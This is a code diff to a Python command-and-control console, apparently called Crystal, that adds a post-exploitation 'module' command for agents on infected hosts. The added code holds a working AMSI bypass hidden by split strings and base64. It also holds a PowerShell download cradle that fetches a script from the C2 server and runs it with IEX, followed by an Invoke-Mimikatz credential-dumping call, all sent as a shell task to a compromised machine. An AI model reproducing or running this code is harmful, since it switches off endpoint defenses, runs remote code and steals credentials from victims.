@@ -4,9 +4,11 @@ import time
 from requests.models import HTTPError
 import yaml
 from yaml.loader import SafeLoader
+
+from lib.helpers.obfuscation_engine import obfuscate_powershell
 from server.models import ListenerModel
 from typing import List
-from server.server import AgentModule, CrystalServer
+from server.server import AgentModule, CrystalServer, ScriptModule
 from lib.helpers.output import Color, failure, get_random_string, printinfo, success
 import os, sys
 import random, requests
@@ -54,6 +56,14 @@ class Api:
         """
         listeners = requests.get(f'{API_BASE}/api/listeners').json()['data']
         return listeners
+
+    @staticmethod
+    def get_available_post_modules() -> List[ScriptModule]:
+        """
+        Get active post modules
+        """
+        post_modules = requests.get(f'{API_BASE}/api/post/modules').json()['data']
+        return post_modules
 
     @staticmethod
     def create_listener(listen_ip="0.0.0.0", port=1337, name=""):
@@ -173,6 +183,29 @@ class InteractAgentConsole(BaseConsole):
         success(f"Queued command: {command} to agent {self.selected_agent['name']}")
         time.sleep(4) # TODO either wait for a signal or make a global variable indicating whether result returned
 
+    def do_module(self, args):
+        'Run a Post-Exploitation module on the infected host'
+        # prepare download cradle with amsi bypass for script
+        # id is the index of the available post modules array
+
+        # get id of module
+        module_id = 0
+        for module in Api.get_available_post_modules(): # todo only load available modules on startup
+            if module['name'] == args:
+                amsi_bypass = "[Ref].Assembly.GetType('System.Mana'+'gement.Automa'+'tion.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVA'+'HQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4A'+'aQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,St'+'atic').SetValue($null,$true)"
+                # TODO amsi_bypass = obfuscate_powershell(amsi_bypass)
+                script = f"{amsi_bypass}; IEX(New-Object Net.WebClient).DownloadString('{API_BASE}/api/dl/{module_id}')"
+                script += "; Invoke-Mimikatz" # TODO: get from modules.yaml or py script
+
+                Api.add_agent_task(self.selected_agent['name'], f"shell {script}")
+                success(f"Queued module execution: {args} to agent {self.selected_agent['name']}")
+                time.sleep(4)  # TODO either wait for a signal or make a global variable indicating whether result returned
+                return
+            module_id += 1
+
+    def complete_module(self, text, line, begidx, endidx):
+        return [module['name'] for module in Api.get_available_post_modules() if module['name'].startswith(text)]
+
     def do_download(self, args):
         'Download a file from the infected host'
         raise NotImplementedError
@@ -277,7 +310,7 @@ class CrystalConsole(BaseConsole):
 # socketio
 def on_message(msg):
     if type(msg) == str:
-        success("Message received from server:", newline=True)
+        success("Received message:", newline=True)
         print(msg)
 
 def socket_thread(socketIO):
